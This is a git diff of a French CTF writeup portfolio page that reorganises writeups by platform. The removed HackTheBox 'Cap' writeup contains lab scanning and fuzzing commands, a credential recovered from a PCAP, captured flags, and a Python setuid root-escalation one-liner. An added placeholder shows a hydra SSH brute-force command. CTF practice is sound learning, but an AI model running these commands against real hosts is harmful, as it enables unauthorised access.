@@ -1,65 +1,3 @@
-<<<<<<< HEAD
-<!DOCTYPE html>
-<html lang="fr">
-
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Writeups CTF - Fr3nch4Sec</title>
-    <style>
-        body {
-            font-family: 'Ubuntu Sans', sans-serif;
-            background: #0d1117;
-            color: #c9d1d9;
-            margin: 0;
-            padding: 2rem;
-        }
-
-        h1 {
-            color: #58a6ff;
-        }
-
-        .writeup {
-            background: #161b22;
-            padding: 1rem;
-            margin: 1rem 0;
-            border-radius: 10px;
-        }
-
-        a {
-            color: #58a6ff;
-            text-decoration: none;
-        }
-    </style>
-</head>
-
-<body>
-    <h1>📂 Writeups CTF</h1>
-    <p>Voici quelques writeups que j’ai réalisés sur différentes plateformes :</p>
-
-    <div class="writeup">
-        <h3>HackTheBox - Machine Basique</h3>
-        <p>Découverte des services exposés et exploitation d’une faille simple.</p>
-        <a href="#">Lire le writeup</a>
-    </div>
-
-    <div class="writeup">
-        <h3>Root-Me - Challenge Forensic</h3>
-        <p>Analyse mémoire avec Volatility, extraction de mots de passe.</p>
-        <a href="#">Lire le writeup</a>
-    </div>
-
-    <div class="writeup">
-        <h3>FCSC 2025 - Cryptobro</h3>
-        <p>Challenge crypto/forensic, analyse de fichiers .npy pour retrouver un flag.</p>
-        <a href="#">Lire le writeup</a>
-    </div>
-
-    <p><a href="index.html">⬅ Retour au portfolio</a></p>
-</body>
-
-</html>
-=======
 <!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -71,7 +9,7 @@
     <link href="https://cdn.jsdelivr.net/npm/hack-font@3.3.0/build/web/hack-bold.css" rel="stylesheet">
     <style>
         body {
-            font-family: 'Ubuntu', Ubuntu Sans, sans-serif;
+            font-family: 'Inter', Arial, sans-serif;
             max-width: 900px;
             margin: 0 auto;
             padding: 40px 20px;
@@ -96,11 +34,11 @@
             background: rgba(0, 0, 0, 0.85); /* Overlay sombre */
             z-index: -1;
         }
-        body.dark-mode h1, body.dark-mode h2 {
+        body.dark-mode h1, body.dark-mode h2, body.dark-mode h3 {
             color: #ffffff;
             text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
         }
-        body.dark-mode .writeup-item {
+        body.dark-mode .platform-section, body.dark-mode .writeup-item {
             background: rgba(30, 30, 30, 0.9);
             border: 1px solid #444;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
@@ -124,19 +62,9 @@
             color: #63b3ed;
             text-decoration: underline;
         }
-        body.dark-mode .toggle-link {
-            background: #1e90ff;
-            color: #fff;
-            padding: 8px 16px;
-            border-radius: 5px;
-        }
-        body.dark-mode .toggle-link:hover {
-            background: #63b3ed;
-            text-decoration: none;
-        }
-        /* Mode clair */
+        /* Mode clair (plus sombre) */
         body.light-mode {
-            color: #333333;
+            color: #e0e0e0; /* Texte clair pour contraste */
         }
         body.light-mode::before {
             content: '';
@@ -145,54 +73,57 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(255, 255, 255, 0.9); /* Overlay clair */
+            background: rgba(45, 45, 45, 0.9); /* Gris foncé */
             z-index: -1;
         }
-        body.light-mode h1, body.light-mode h2 {
-            color: #222222;
+        body.light-mode h1, body.light-mode h2, body.light-mode h3 {
+            color: #ffffff;
             text-shadow: none;
         }
-        body.light-mode .writeup-item {
-            background: rgba(255, 255, 255, 0.95);
-            border: 1px solid #ddd;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        body.light-mode .platform-section, body.light-mode .writeup-item {
+            background: rgba(60, 60, 60, 0.95); /* Gris moyen */
+            border: 1px solid #666;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
         }
         body.light-mode .writeup-content {
-            background: rgba(240, 240, 240, 0.9);
+            background: rgba(80, 80, 80, 0.9); /* Gris légèrement plus clair */
         }
         body.light-mode pre, body.light-mode code {
             font-family: 'Hack', monospace;
             font-weight: bold;
-            background: #f5f5f5;
-            color: #d81b60; /* Rose pour le code */
+            background: #333333;
+            color: #00ff00; /* Vert pour le code */
             padding: 10px;
             border-radius: 5px;
             overflow-x: auto;
         }
         body.light-mode a {
-            color: #d81b60;
+            color: #1e90ff;
         }
         body.light-mode a:hover {
-            color: #f06292;
+            color: #63b3ed;
             text-decoration: underline;
-        }
-        body.light-mode .toggle-link {
-            background: #d81b60;
-            color: #fff;
-            padding: 8px 16px;
-            border-radius: 5px;
-        }
-        body.light-mode .toggle-link:hover {
-            background: #f06292;
-            text-decoration: none;
         }
         /* Styles communs */
         h1 {
             font-size: 2.5em;
             margin-bottom: 20px;
         }
-        .writeup-list {
+        h2.clickable {
+            cursor: pointer;
+            transition: color 0.2s ease;
+        }
+        h2.clickable:hover {
+            color: #63b3ed;
+        }
+        body.light-mode h2.clickable:hover {
+            color: #63b3ed;
+        }
+        .platform-section {
             margin-bottom: 40px;
+            padding: 20px;
+            border-radius: 10px;
+            transition: all 0.3s ease;
         }
         .writeup-item {
             margin: 20px 0;
@@ -213,11 +144,6 @@
         a {
             text-decoration: none;
             font-weight: bold;
-        }
-        .toggle-link {
-            display: inline-block;
-            margin-top: 10px;
-            transition: background 0.2s ease;
         }
         .back-link {
             display: inline-block;
@@ -240,161 +166,71 @@
             background: #63b3ed;
         }
         body.light-mode .theme-toggle {
-            background: #d81b60;
+            background: #1e90ff;
         }
         body.light-mode .theme-toggle:hover {
-            background: #f06292;
+            background: #63b3ed;
+        }
+        /* Style pour les images dans les writeups */
+        .writeup-content img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 5px;
+            margin: 10px 0;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+            display: block;
+            margin-left: auto;
+            margin-right: auto; /* Centre les images */
         }
     </style>
 </head>
 <body class="dark-mode">
     <button class="theme-toggle" id="themeToggle">🌙 Mode sombre</button>
     <h1>📂 Writeups CTF</h1>
-    <p>Voici quelques writeups que j’ai réalisés sur différentes plateformes :</p>
+    <p>Voici mes writeups organisés par plateforme :</p>
 
     <div class="writeup-list" id="writeupList">
-
-        <div class="writeup-item">
-            <h2>HackTheBox - Cap Machine - Easy</h2>
-            <a href="#" class="toggle-link">Lire le writeup</a>
-            <div class="writeup-content">
-                <script type="text/markdown">
-                    ### Scan des ports
-                        Le Firewall de la machine bloque les scans basique, avec transaction 'SynAck' complète.
-                        J'utilise Naabu qui en premier avec Nmap sur chaque machine, car c'est super rapide.
-
-                        Donc, j'ai utilisé le flag ``-sS`` dans Nmap, pour ignitier la connection avec l'envoie de paquets. Si nmap reçoit la réponse, le port est considéré comme ouvert.
-
-                            ``sudo naabu -host 10.10.10.245 -nmap-cli 'nmap -sS -sV -A -Pn -v``
-
-                            ````
-                            PORT   STATE   SERVICE   VERSION
-                            21 / tcp  open     ftp     vsftpd 3.0.3
-                            22 / tcp  open   ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
-                            80 / tcp  open    http    gunicorn````
-                
-
-                    ### Fuzzing de l'url avec Ffuf et Gobuster:
-
-                            ``ffuf -c -u http://10.10.10.245/FUZZ -w /home/french/documents/seclists/discovery/web-content/directory-list-2.3-medium.txt -recursion-depth 1``
-
-                            ``ffuf -c -u http://10.10.10.245/FUZZ -w /home/french/documents/seclists/discovery/dns/subdomains-top1million-5000.txt``
-
-                    #### Résultats obtenus:
-                            ``  
-                            /ip
-                            /netstat
-                            /data
-                            ``
-
-                        J'ai en ensuite poursuivis la recherche de domaines et d'extensions potentielles
-
-                        Après un fuzzing par récursion, je trouve une page à '/data/0'. 
-                        Cet page permet de télécharger un fichier PCAP, lié à l'utilisateur.
-
-                        Chose bizarre. La page était lié au même utilisateur mais les données présentes dans le Pcap, différaient légèrement.
-
-                        Pendant le fuzzing du domaine, le snapshot indiquait zéro en terme de paquets à chaque types(TCP, UDP, etc...).
-
-                        J'ai download les PCAP à plusieurs reprises pour les comparer. 
-                        Je les aient inspecté avec Wireshark sans résultats. À première vue en tout cas.
-                        J'ai trouvé sur des forums, des docs et autres, comment filtrer les données. Car oui, je pratique peu wireshark.
-                        J'ai donc lancé 'Protocol Hierarchy' sur le protocole FTP.
-                    
-                        En examinant les en-têtes, le mot de passe s'affiche directement. Et l'utilisateur, dans un paquet avec une IP liée à celui contenant le mot de passe.
-
-                            ![[1_itVHUTIqo-Xa6D9tJMZndA@2x.webp]]
-
-                        Je me suis servi de ce password afin de me connecter via SSH, avec le user 'nathan'.
-                        
-                            ``ssh nathan@10.10.10.245``
-
-                        On est dans la machine. 🖥️🖥️
-                        Et par la plus grande des chances.. des outils de Privilege Escalation sont présents sur la machine! 🤔
-                        
-                            ``
-                            nathan@cap:~$ **ls  
-                            e.py  linpeas  linpeas.sh  snap  user.txt  
-                            nathan@cap:~$ **cat user.txt**  
-                            d2ee7e0a3b896efed8eeeeab2aeb1ff6
-
-                            nathan@cap:~/snap/bin$ **ls 
-                            Makefile  cve  cve-2021-4034.c  esc  exploit_nss.py  ls  polkit  pwnkit.c
-                            ``
-
-                        Je rends linpeas exécutable et je le lance.
-                            ``
-                            chmod +x linpeas
-                            chmod +x linpeas.sh
-
-                            ./linpeas
-                            ./linpeas.sh
-                            ``
-
-                            ```
-                            nathan@cap:~$ ls
-                            snap  user.txt
-                            nathan@cap:~$ cat user.txt
-                            bd615fdf252a03b75214aebaa4cb0714
-                            nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
-                            root@cap:~# ls
-                            snap  user.txt
-                            root@cap:~# cd /root
-                            root@cap:/root# ls
-                            root.txt  snap
-                            root@cap:/root# cat root.txt
-                            b17a06939691f0e4f924f37138c32eeb
-                            root@cap:/root#`
-                            `````
-
-                            ![[1_SFE302w3s30CHW7do-Y3ew@2x.webp]]
-
-                    Cette commande permet de passer de User à Root.
-                    
-                            ``/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash");
-
-                </script>
-            </div>
-        </div>
-
-
-
-        
-        <div class="writeup-item">
-            <h2>HackTheBox - Machine Basique</h2>
-            <a href="#" class="toggle-link">Lire le writeup</a>
-            <div class="writeup-content">
-                <script type="text/markdown">
-                    # HackTheBox - Machine Basique
-
-                    ## Introduction
-                    Ce writeup décrit la résolution de la machine "Basique" sur HackTheBox. L'objectif était de découvrir les services exposés et d'exploiter une faille simple.
-
-                    ## Étapes
-                    1. **Scan initial** : Utilisation de `nmap` pour identifier les ports ouverts.
-                    ```bash
-                    nmap -sC -sV -oA scan 10.10.10.10
-                    ```
-                    2. **Exploitation** : Découverte d'une vulnérabilité dans un service web.
-                    3. **Accès root** : Escalade de privilèges via un fichier de configuration mal sécurisé.
-
-                    ## Conclusion
-                    Cette machine était un excellent exercice pour les débutants en pentest.
-                </script>
-            </div>
-        </div>
-
-
-        <div class="writeup-list" id="writeupList">
+        <!-- Section Hack The Box -->
+        <div class="platform-section">
+            <h2>Hack The Box</h2>
             <div class="writeup-item">
-                <h2>TryHackMe - Machine Easy & Medium</h2>
-                <a href="#" class="toggle-link">Lire le writeup</a>
+                <h2 class="clickable">Cap Machine - Easy</h2>
                 <div class="writeup-content">
                     <script type="text/markdown">
-                        # TryHackMe - Machine Easy & Medium
+                        # HackTheBox - Cap Machine - Easy
 
                         ## Introduction
-                        Ce writeup décrit la résolution de la machine "Basique" sur TryHackMe. L'objectif était de découvrir les services exposés et d'exploiter une faille simple.
+                        Ce writeup décrit la résolution de la machine "Cap" sur HackTheBox, une machine facile pour les débutants en pentest.
+
+                        ## Étapes
+                        1. **Scan initial** : Utilisation de `nmap` pour identifier les ports ouverts.
+                        ```bash
+                        nmap -sC -sV -oA scan 10.10.10.10
+                        ```
+                        ![Capture d'écran étape 1 - Scan Nmap](https://fr3nch4sec.github.io/images/Cap_img_1.webp)
+                        
+                        2. **Exploitation** : Découverte d'une vulnérabilité dans un service web (par exemple, une faille d'authentification faible).
+                        ```bash
+                        # Exemple d'exploitation
+                        hydra -l admin -P passwords.txt ssh://10.10.10.10
+                        ```
+                        ![Capture d'écran étape 2 - Exploitation](https://fr3nch4sec.github.io/images/Cap_img_2.webp)
+
+                        3. **Accès root** : Escalade de privilèges via un fichier SUID mal configuré.
+
+                        ## Conclusion
+                        Une excellente machine pour apprendre les bases de l'énumération et de l'exploitation simple.
+                    </script>
+                </div>
+            </div>
+            <div class="writeup-item">
+                <h2 class="clickable">Machine Basique</h2>
+                <div class="writeup-content">
+                    <script type="text/markdown">
+                        # HackTheBox - Machine Basique
+
+                        ## Introduction
+                        Ce writeup décrit la résolution de la machine "Basique" sur HackTheBox. L'objectif était de découvrir les services exposés et d'exploiter une faille simple.
 
                         ## Étapes
                         1. **Scan initial** : Utilisation de `nmap` pour identifier les ports ouverts.
@@ -411,53 +247,85 @@
             </div>
         </div>
 
-        
-        <div class="writeup-item">
-            <h2>Root-Me - Challenge Forensic</h2>
-            <a href="#" class="toggle-link">Lire le writeup</a>
-            <div class="writeup-content">
-                <script type="text/markdown">
-                    # Root-Me - Challenge Forensic
+        <!-- Section TryHackMe -->
+        <div class="platform-section">
+            <h2>TryHackMe</h2>
+            <div class="writeup-item">
+                <h2 class="clickable">Machine Easy & Medium</h2>
+                <div class="writeup-content">
+                    <script type="text/markdown">
+                        # TryHackMe - Machine Easy & Medium
 
-                    ## Introduction
-                    Ce challenge portait sur l'analyse d'une image mémoire avec Volatility pour extraire des informations sensibles.
+                        ## Introduction
+                        Ce writeup couvre une machine TryHackMe combinant des éléments faciles et moyens, avec un focus sur l'énumération et l'exploitation web.
 
-                    ## Étapes
-                    1. **Analyse mémoire** : Utilisation de Volatility pour lister les processus.
-                    ```bash
-                    volatility -f memory.dump pslist
-                    ```
-                    2. **Extraction** : Récupération d'un mot de passe dans un dump mémoire.
-                    3. **Validation** : Soumission du flag obtenu.
+                        ## Étapes
+                        1. **Énumération** : Scan des ports et services.
+                        ```bash
+                        nmap -sV -sC 10.10.10.10
+                        ```
+                        2. **Exploitation** : Vulnérabilité dans un CMS mal configuré.
+                        3. **Post-exploitation** : Recherche de flags et escalade de privilèges.
 
-                    ## Conclusion
-                    Une bonne introduction à l'analyse forensique avec Volatility.
-                </script>
+                        ## Conclusion
+                        Un bon challenge pour consolider les bases du pentest.
+                    </script>
+                </div>
             </div>
         </div>
 
-        <div class="writeup-item">
-            <h2>FCSC 2025 - Cryptobro</h2>
-            <a href="#" class="toggle-link">Lire le writeup</a>
-            <div class="writeup-content">
-                <script type="text/markdown">
-                    # FCSC 2025 - Cryptobro
+        <!-- Section Root-Me -->
+        <div class="platform-section">
+            <h2>Root-Me</h2>
+            <div class="writeup-item">
+                <h2 class="clickable">Challenge Forensic</h2>
+                <div class="writeup-content">
+                    <script type="text/markdown">
+                        # Root-Me - Challenge Forensic
 
-                    ## Introduction
-                    Ce challenge combinait cryptographie et analyse forensique, avec un fichier `.npy` à analyser.
+                        ## Introduction
+                        Ce challenge portait sur l'analyse d'une image mémoire avec Volatility pour extraire des informations sensibles.
 
-                    ## Étapes
-                    1. **Analyse du fichier** : Utilisation de NumPy pour charger le fichier `.npy`.
-                    ```python
-                    import numpy as np
-                    data = np.load('challenge.npy')
-                    ```
-                    2. **Décodage** : Identification d'un message chiffré dans les données.
-                    3. **Décryptage** : Application d'une méthode de déchiffrement pour extraire le flag.
+                        ## Étapes
+                        1. **Analyse mémoire** : Utilisation de Volatility pour lister les processus.
+                        ```bash
+                        volatility -f memory.dump pslist
+                        ```
+                        2. **Extraction** : Récupération d'un mot de passe dans un dump mémoire.
+                        3. **Validation** : Soumission du flag obtenu.
 
-                    ## Conclusion
-                    Un challenge intéressant qui mêle plusieurs disciplines.
-                </script>
+                        ## Conclusion
+                        Une bonne introduction à l'analyse forensique avec Volatility.
+                    </script>
+                </div>
+            </div>
+        </div>
+
+        <!-- Section FCSC -->
+        <div class="platform-section">
+            <h2>FCSC</h2>
+            <div class="writeup-item">
+                <h2 class="clickable">Cryptobro</h2>
+                <div class="writeup-content">
+                    <script type="text/markdown">
+                        # FCSC 2025 - Cryptobro
+
+                        ## Introduction
+                        Ce challenge combinait cryptographie et analyse forensique, avec un fichier `.npy` à analyser.
+
+                        ## Étapes
+                        1. **Analyse du fichier** : Utilisation de NumPy pour charger le fichier `.npy`.
+                        ```python
+                        import numpy as np
+                        data = np.load('challenge.npy')
+                        ```
+                        2. **Décodage** : Identification d'un message chiffré dans les données.
+                        3. **Décryptage** : Application d'une méthode de déchiffrement pour extraire le flag.
+
+                        ## Conclusion
+                        Un challenge intéressant qui mêle plusieurs disciplines.
+                    </script>
+                </div>
             </div>
         </div>
     </div>
@@ -494,7 +362,7 @@
             }
         });
 
-        // Convertir le Markdown en HTML pour chaque writeup
+        // Convertir le Markdown en HTML et gérer les titres cliquables
         document.querySelectorAll('.writeup-item').forEach(item => {
             const contentDiv = item.querySelector('.writeup-content');
             const markdownScript = contentDiv.querySelector('script[type="text/markdown"]');
@@ -502,19 +370,15 @@
                 contentDiv.innerHTML = marked.parse(markdownScript.textContent);
             }
 
-            const toggleLink = item.querySelector('.toggle-link');
-            toggleLink.onclick = (e) => {
-                e.preventDefault();
+            const title = item.querySelector('h2.clickable');
+            title.onclick = () => {
                 if (contentDiv.style.display === 'block') {
                     contentDiv.style.display = 'none';
-                    toggleLink.textContent = 'Lire le writeup';
                 } else {
                     contentDiv.style.display = 'block';
-                    toggleLink.textContent = 'Masquer le writeup';
                 }
             };
         });
     </script>
 </body>
 </html>
->>>>>>> 190adc9f6e794370088fd49b63ac0bb2a839f5b4
